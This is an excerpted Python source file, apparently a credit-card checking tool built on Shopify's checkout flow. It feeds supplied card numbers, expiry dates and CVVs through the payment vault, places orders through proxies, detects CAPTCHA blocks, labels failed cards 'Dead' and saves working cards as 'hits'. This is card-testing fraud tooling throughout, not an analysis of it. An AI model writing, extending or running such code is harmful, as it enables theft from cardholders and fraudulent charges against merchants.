...
def resolve_address(url: str, currency: Optional[str] = None) -> Dict[str, str]:
    ...
    if currency:
        cc_code = CURRENCY_TO_COUNTRY.get(currency.upper())
        if cc_code and cc_code in ADDRESS_BOOK: return ADDRESS_BOOK[cc_code]
...
def is_captcha_required(response_text: str) -> bool:
    ...
    indicators = ['CAPTCHA_REQUIRED', 'captcha required', 'CAPTCHA CHALLENGE', 'hcaptcha', 'h-captcha']
...
class ShopifyCheckoutSession:
            ...
            try:
                async with session.post(graphql_url, params=params, headers=self.headers, json=json_data, proxy=self.proxy) as resp:
                    ...
                    if is_captcha_required(resp_text):
                        sitekey = extract_between(resp_text, 'sitekey":"', '"') or "unknown"
                        return False, f"CAPTCHA_REQUIRED [Sitekey: {sitekey}]"
    ...
    async def init_checkout(self, session) -> Tuple[bool, str]:
        ...
        async with session.post(self.site_url + '/checkout/', allow_redirects=True, headers=checkout_headers, proxy=self.proxy) as resp:
            ...
            match = re.search(r'/checkouts/(?:cn|c)/([^/?]+)', self.checkout_url)
            ...
            self.subtotal = extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            ...
            'variables': {
                ...
                'delivery': {
                    'deliveryLines': [{
                        ...
                        'targetMerchandiseLines': {'any': True}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True
                    }],
                ...
                'tip': {'tipLines': []}, 'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': '0.00', 'currencyCode': self.currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                ...
                if payment.get('__typename') == 'FilledPaymentTerms':
                    for method in payment.get('availablePaymentLines', []):
                        ...
                        if pm.get('name') or pm.get('paymentMethodIdentifier'):
                            ...
                            break
                if self.payment_identifier: return True, "OK"
    ...
    async def tokenize_card(self, session) -> Tuple[bool, str]:
        payload = {
            "credit_card": {"number": self.cc_info['cc'], "month": int(self.cc_info['mes']), "year": int(self.cc_info['ano']), "verification_value": self.cc_info['cvv'], "name": f"{self.firstName} {self.lastName}", "start_month": None, "start_year": None, "issue_number": ""},
            "payment_session_scope": self.domain
        }
        vault_headers = {'Content-Type': 'application/json', 'Accept': 'application/json', 'Origin': 'https://checkout.pci.shopifyinc.com', 'User-Agent': self.headers['User-Agent'], 'sec-fetch-site': 'same-origin'}
        ...
        submit_vars = {
            'input': {
                ...
                'payment': {
                    'totalAmount': {'any': True},
                    'paymentLines': [{
                        'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': self.payment_identifier, 'sessionId': token, 'billingAddress': {'streetAddress': {'address1': self.street, 'address2': self.address2, 'city': self.city, 'countryCode': self.country_code, 'postalCode': self.s_zip, 'firstName': self.firstName, 'lastName': self.lastName, 'zoneCode': self.state, 'phone': self.phone}}, 'cardSource': None}},
                ...
                'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': self.tax_amount, 'currencyCode': self.currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
    ...
    async def poll_receipt(self, session, receipt_id: str) -> Tuple[bool, str]:
        ...
        if last_text:
            if 'processedreceipt' in last_text.lower(): return True, "ORDER_PLACED"
...
async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None) -> Tuple[bool, str, str, str, str, str, float, float]:
    ...
    try:
        ...
        timeout = aiohttp.ClientTimeout(sock_connect=5, total=60)
...
def shopify_checker():
    try:
        ...
        except ValueError as e: return jsonify({"error": str(e), "status": "Dead"}), 400
        ...
        if hit_status: save_hit_to_file(cc_string, hit_status, gateway, str(price))
